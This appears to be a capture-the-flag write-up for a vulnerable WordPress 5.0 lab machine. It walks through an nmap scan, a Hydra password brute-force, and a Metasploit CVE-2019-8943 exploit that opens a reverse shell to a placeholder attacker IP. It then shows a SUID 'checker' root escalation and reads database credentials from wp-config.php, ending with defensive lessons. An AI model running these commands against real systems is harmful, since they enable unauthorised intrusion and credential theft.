## Reconnaissance

I started by scanning the target to identify running services and their versions.

```bash
nmap -sV -sC -O -p 22,80,139,445 <TARGET_IP>

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http        Apache httpd 2.4.29 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

The system is running Linux 4.15 with WordPress 5.0 on port 80. Both SSH and Samba services are present, which could be useful, but the web application is where the vulnerability lies.

WordPress 5.0 was released in December 2018 and contains CVE-2019-8943 — a Remote Code Execution vulnerability in the image crop functionality. I found two user accounts but needed credentials to exploit WordPress. XML-RPC being enabled meant I could attempt brute-force attacks.

I also checked SMB to see what else was available:


The SMB share was accessible anonymously. I downloaded several files (an image, a video, a PNG) but the steganographic image only contained a red herring — a text file saying "You've found yourself in a rabbit hole, friend." This was a deliberate distraction.

## Brute-forcing WordPress Credentials

With XML-RPC enabled and a user account identified, I ran Hydra to crack the password:

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered"

[+] Host: <TARGET_IP>
[+] User: kwheel
[+] Password: cutiepie1
```

The password was weak and found in rockyou.txt. I gained access to the WordPress dashboard, but the `kwheel` user lacked administrative privileges — I couldn't modify theme files or install plugins directly. However, I had valid credentials, which was enough to exploit CVE-2019-8943.

## WordPress RCE — CVE-2019-8943

WordPress 5.0 contains a vulnerability in how it handles image cropping. Authenticated users can manipulate the crop operation to include arbitrary PHP code in theme files. I used Metasploit to automate this:

```bash
msfconsole
search wp crop
use exploit/multi/http/wp_crop_rce

set USERNAME kwheel
set PASSWORD cutiepie1
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>

run

[*] Started reverse TCP handler on <ATTACKER_IP>:<ATTACKER_PORT>
[*] Authenticating with WordPress...
[+] Authenticated with WordPress
[*] Uploading payload...
[+] Image uploaded
[*] Including into theme...
[*] Meterpreter session 1 opened (<ATTACKER_IP>:<ATTACKER_PORT> -> <TARGET_IP>:39254)
```

I obtained a reverse shell running as `www-data`. I immediately stabilized it using Python:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

At this point I had code execution as the web server user. Now I needed to escalate to root.

## Finding the Privilege Escalation Vector

I enumerated the system for SUID binaries and other escalation opportunities:

```bash
find / -type f -perm -u=s 2>/dev/null | grep -Ev "snap"

/usr/sbin/checker
/usr/bin/passwd
[... other standard binaries ...]
```

The `/usr/sbin/checker` binary stood out — it's not a standard Linux utility. I analyzed it using `strings`:

```bash
strings /usr/sbin/checker | grep -E "(getenv|admin|system)"

getenv
admin
system
/bin/bash
Not an Admin
```

The binary checks for an environment variable named `admin` and spawns a bash shell. This looked like a direct privilege escalation if I could satisfy the check.

---

## SUID Binary Exploitation

I used `ltrace` to see exactly what the binary does at runtime:

```bash
ltrace /usr/sbin/checker

getenv("admin")                    = NULL
puts("Not an Admin")               = 13
Not an Admin
+++ exited (status 0) +++
```

The binary exits if `admin` is not set. Let me set it:

```bash
export admin=1
ltrace /usr/sbin/checker

getenv("admin")                    = "1"
setuid(0)                          = -1
system("/bin/bash"
```

Interesting — `setuid(0)` returned -1 (failure), but the shell was spawned anyway. This is because the binary has the SUID bit set, so it already runs with root privileges. The kernel grants these privileges at execution time. When `system("/bin/bash")` is called, it inherits the root privileges that the SUID bit granted.

The vulnerability is that the binary uses an environment variable — something **completely under the user's control** — as its authentication mechanism. The developers assumed only administrators would set this variable, but that's not how operating systems work.

Let me exploit it:

```bash
admin=1 /usr/sbin/checker

id

uid=0(root) gid=33(www-data) groups=33(www-data)
```

✅ UID 0. I'm root.

## Post-Exploitation

Once I had root access, I explored the system and found database credentials in the WordPress configuration:

```bash
cat /var/www/wordpress/wp-config.php | grep -A2 "DB_"

define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');
```

These credentials are stored in plaintext in a world-readable configuration file — another security failure. While I already had root access, finding plaintext credentials in application configs is a common real-world finding.

## Key Takeaways

**Environment variables are not security boundaries.** SUID binaries should never rely on environment variables for authentication or authorization. The kernel provides privilege elevation; application-level checks using user-controlled input (like environment variables) create a false sense of security.

**Weak password dictionaries bite you.** The password `cutiepie1` was in rockyou.txt. In real-world scenarios, enforcing password policies and using multi-factor authentication prevents this attack vector entirely.

**Known vulnerabilities in legacy software are critical.** WordPress 5.0 was released over 7 years ago (in real time). Running outdated software with documented RCE vulnerabilities is a significant risk. Regular patching and security monitoring are essential.

**Plaintext credentials in configuration files.** Storing database passwords in world-readable configuration files is a common mistake. Secrets should be stored in environment variables or secure vaults, never in code or configs checked into version control.
